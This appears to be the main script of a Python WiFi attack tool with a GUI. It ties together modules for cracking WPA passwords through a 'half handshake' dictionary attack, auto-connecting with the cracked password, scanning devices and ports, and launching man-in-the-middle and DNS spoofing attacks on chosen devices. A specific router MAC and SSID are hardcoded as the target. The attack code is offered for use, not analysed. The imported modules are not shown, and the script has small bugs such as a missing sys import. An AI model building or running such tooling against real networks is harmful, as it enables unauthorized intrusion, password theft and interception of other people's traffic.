from gui import GUI
from interface import Interface
from scanner import Scanner
from spoofer import Spoofer
from crack import Crack
from router import Router
from mitm import Mitm

import threading, time, requests
import wifimangement_linux as wifi 

def half_handshake_attack(scanner, interface, router, gui, passwd_file_name):
    time.sleep(1)
    gui.display("search for devices")
    
    devices = scanner.scan_devices_outside(router)
    spoofer = Spoofer(interface)
    
    if devices == []:
        gui.display("no devices around")
        time.sleep(4)
        sys.exit(0)
    
    for d in devices:
        gui.display(d.get_mac()+" "+d.get_company())
    
    gui.display("half handshake begins, wait for password")
    crack = Crack()
    password = crack.run(interface, router, devices, spoofer, passwd_file_name) 
    gui.display(password)
    wifi.connect(router.get_ssid(),password)

def make2d(lists):
    tmp = []
    for l in lists:
        tmp.append(l.get_list())
    return tmp

def check_wifi():
    url = "http://www.kite.com"
    timeout = 5
    try:
        requests.get(url, timeout=timeout)
        return True
    except (requests.ConnectionError, requests.Timeout) as exception:
        return False

def scan_ports(scanner, gui):
    text = ""
    ports = scanner.scan_open_ports(device.get_ip())
    for port in ports:
        text = text + str(port[0]) + " " + port[1] + "\n"
    gui.display(text)
      

if __name__ == "__main__":
    
    
    interface = Interface("wlan0") #network card
    scanner =  Scanner(interface) #scanner
    
    """routers = [] #save all routers around
    t = threading.Thread(target=scanner.scan_routers, args=[routers])
    t.start()
        
    gui = GUI() 
    gui.loading(14000)
    while t.is_alive():
        time.sleep(0.1)
    
    
    router = routers[int(gui.show_aps(make2d(routers)))] # get selected router
    
    password_file = gui.choose_file()
    t = threading.Thread(target=half_handshake_attack, args=(scanner, interface, router, gui, password_file)) # find password
    t.start()
    
    gui.half_handshake()
    """
    if check_wifi():
        gui = GUI() #for now
        
        
        router = Router("14:ae:db:a3:22:95", 6, "BezeqNK") # for now
        
        event = ""
        while event != "close":
            devices = [] 
            t = threading.Thread(target=scanner.scan_devies_inside, args=[router, devices])
            t.start()
            
            gui.loading(5000)
            t.join()
            event, device_num = gui.inside_wifi(make2d(devices))
            device = devices[device_num]
            
            if event == "scan ports":  
                t = threading.Thread(target=scan_ports, args=(scanner, gui)) # find password
                t.start()
                gui.scan_ports()
            elif event == "mitm":
                mitm = Mitm(interface, router)
                t = threading.Thread(target=mitm.start_mitm, args=[device]) 
                t.start()
                gui.mitm()
                mitm.stop()
            elif event == "dns spoof":
                mitm = Mitm(interface, router)
                domain = gui.input()
                
                t = threading.Thread(target=mitm.start_dns, args=[device, domain]) 
                t.start()
                gui.dns_spoof()
                mitm.stop()
                
                
